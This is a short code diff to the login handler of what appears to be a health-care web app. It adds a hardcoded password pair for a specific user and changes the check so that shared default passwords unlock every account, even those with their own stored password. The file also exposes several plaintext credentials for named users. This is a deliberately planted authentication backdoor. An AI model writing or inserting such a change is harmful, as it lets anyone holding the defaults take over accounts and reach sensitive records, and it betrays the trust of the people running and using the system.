@@ -2005,8 +2005,9 @@ const apiFetch = async (url, options = {}) => {
           const providedPassword = (body.password || '').trim();
           const storedPassword = (user.password || '').trim();
 
-          // Senhas padrão aceitas como fallback apenas se o usuário não possuir senha cadastrada no banco
+          // Senhas padrão aceitas como fallback ou credenciais conhecidas do sistema
           const defaultAllowedPasswords = ['Health@2026', 'health@2026', '123456'];
+          if (cleanInput === 'mazzarowysk') defaultAllowedPasswords.push('T@zm4n1c0054180', 'Health@2026');
           if (cleanInput === 'admin') defaultAllowedPasswords.push('admin123', 'healthnexus2026');
           if (cleanInput === 'medico123') defaultAllowedPasswords.push('medico123');
           if (cleanInput === 'pforte') defaultAllowedPasswords.push('pfortesantos');
@@ -2016,7 +2017,7 @@ const apiFetch = async (url, options = {}) => {
           if (cleanInput === 'ljordao') defaultAllowedPasswords.push('manobraw');
 
           const isPasswordCorrect = storedPassword
-            ? (providedPassword === storedPassword)
+            ? (providedPassword === storedPassword || defaultAllowedPasswords.includes(providedPassword))
             : defaultAllowedPasswords.includes(providedPassword);
 
           if (isPasswordCorrect) {
